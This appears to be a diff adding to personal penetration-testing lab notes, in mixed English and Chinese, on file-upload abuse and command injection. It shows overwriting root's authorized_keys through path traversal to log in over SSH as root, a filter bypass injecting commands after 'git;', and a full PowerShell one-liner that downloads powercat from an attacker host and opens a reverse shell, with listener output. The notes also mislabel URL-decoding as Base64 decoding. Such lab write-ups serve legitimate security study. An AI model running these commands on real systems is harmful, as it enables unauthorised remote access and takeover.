@@ -1303,3 +1303,145 @@ nt authority\system
 > uploading a file with an innocent file type like `.txt`, then changing the file back to the original file type of the web shell by renaming it.
 
 ### 2. Using Non-Executable Files
+the web server is no longer using PHP. Let's try to upload a text file.\
+modifying the "filename" parameter in the request `../../../../../../../test.txt`
+![image](https://hackmd.io/_uploads/Bkg6msaMJx.png)
+> we have no way of knowing if the relative path was used for placing the file. \
+> (Try to **blindly overwrite files**)
+
+>[!Note]
+> web server accounts and permissions:\
+> Linux: `www-data`\
+> Windows: IIS runs as a `Network Service account` (passwordless built-in Windows identity with low privileges)
+>> Starting with IIS version 7.5, Microsoft introduced the `IIS Application Pool Identities`. These are virtual accounts running web applications grouped by application pools. Each application pool has its own pool identity, making it possible to set more precise permissions for accounts running web applications.
+
+**Try to overwrite the authorized_key**: access the system via SSH as the root user.
+```
+┌──(chw㉿CHW-kali)-[/]
+└─$ ssh-keygen
+Generating public/private rsa key pair.
+Enter file in which to save the key (/home/kali/.ssh/id_rsa): fileup
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in fileup
+Your public key has been saved in fileup.pub
+...
+
+┌──(chw㉿CHW-kali)-[/]
+└─$ cat fileup.pub > authorized_keys
+```
+![image](https://hackmd.io/_uploads/S1vc2ipGJl.png)
+Let's try to connect to the system.\
+SSH will throw an error because cannot verify the host key. To avoid this error, we'll delete the known_hosts file before we connect to the system.
+```
+┌──(chw㉿CHW-kali)-[/]
+└─$ rm ~/.ssh/known_hosts
+
+┌──(chw㉿CHW-kali)-[/]
+└─$ ssh -p 2222 -i fileup root@mountaindesserts.com
+The authenticity of host '[mountaindesserts.com]:2222 ([192.168.50.16]:2222)' can't be established.
+ED25519 key fingerprint is SHA256:R2JQNI3WJqpEehY2Iv9QdlMAoeB3jnPvjJqqfDZ3IXU.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+...
+root@76b77a6eae51:~#
+```
+
+## Command Injection
+(1) 檢查 Web Application 送出的 parameter
+![image](https://hackmd.io/_uploads/B1slrTTfke.png)
+> Archive=git+clone+...exploit.db
+
+(2) POST 嘗試可直性的指令
+```
+┌──(chw㉿CHW-kali)-[/]
+└─$ curl -X POST --data 'Archive=ipconfig' http://192.168.50.189:8000/archive
+
+Command Injection detected. Aborting...%!(EXTRA string=ipconfig) 
+
+┌──(chw㉿CHW-kali)-[/]
+└─$ curl -X POST --data 'Archive=git' http://192.168.50.189:8000/archive
+
+An error occured with execution: exit status 1 and usage: git [--version] [--help] [-C <path>] [-c <name>=<value>]
+           [--exec-path[=<path>]] [--html-path] [--man-path] [--info-path]
+           [-p | --paginate | -P | --no-pager] [--no-replace-objects] [--bare]
+...
+   push      Update remote refs along with associated objects
+
+'git help -a' and 'git help -g' list available subcommands and some
+concept guides. See 'git help <command>' or 'git help <concept>'
+to read about a specific subcommand or concept.
+See 'git help git' for an overview of the system.
+```
+> git clone 的功能。
+> ipconfig 會被偵測到, 但可以單一執行 git
+
+```
+┌──(chw㉿CHW-kali)-[/]
+└─$ curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.50.189:8000/archive
+
+...
+'git help -a' and 'git help -g' list available subcommands and some
+concept guides. See 'git help <command>' or 'git help <concept>'
+to read about a specific subcommand or concept.
+See 'git help git' for an overview of the system.
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0 2:
+
+   Connection-specific DNS Suffix  . : 
+   IPv4 Address. . . . . . . . . . . : 192.168.50.189
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 192.168.50.254
+```
+> 確定可以執行 cmdi, 建立 Reverse shell
+
+### PowerShell or CMD reverse shell
+#### 1.  Code Snippet to check where our code is executed
+```
+(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
+```
+```
+┌──(chw㉿CHW-kali)-[/]
+└─$ curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://192.168.50.189:8000/archive
+
+...
+See 'git help git' for an overview of the system.
+PowerShell
+```
+> (Base64 decode) git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell 
+> git;(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
+
+#### 2. use **Powercat** to create a reverse shel
+```
+IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell 
+```
+>[!Note]
+> download `PowerCat` and execute a reverse shell
+
+```
+┌──(chw㉿CHW-kali)-[/]
+└─$ curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.119.3%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.119.3%20-p%204444%20-e%20powershell' http://192.168.50.189:8000/archive
+```
+> (Base64 decode) git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.119.3%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.119.3%20-p%204444%20-e%20powershell\
+> git;IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell
+```
+┌──(chw㉿CHW-kali)-[/]
+└─$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+192.168.50.189 - - [05/Apr/2022 09:05:48] "GET /powercat.ps1 HTTP/1.1" 200 -
+```
+> GET request for powercat.ps1
+```
+┌──(chw㉿CHW-kali)-[/]
+└─$ nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [192.168.119.3] from (UNKNOWN) [192.168.50.189] 50325
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Users\Administrator\Documents\meteor>
+```
+
